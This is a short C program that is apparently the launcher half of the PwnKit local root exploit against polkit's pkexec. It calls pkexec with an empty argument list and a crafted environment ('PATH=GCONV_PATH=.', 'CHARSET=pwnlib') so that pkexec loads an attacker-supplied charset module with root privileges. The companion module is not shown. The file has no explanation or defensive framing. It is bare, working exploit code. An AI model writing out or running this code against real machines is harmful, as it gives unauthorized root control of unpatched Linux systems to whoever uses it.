#include <stdio.h>
#include <unistd.h>


int main(void) {

	char	*argv[] = {NULL};
	char	*envp[] = { "conf", "PATH=GCONV_PATH=.", "CHARSET=pwnlib", "SHELL=gbrsh", NULL};

	execve("/usr/bin/pkexec", argv, envp);
}
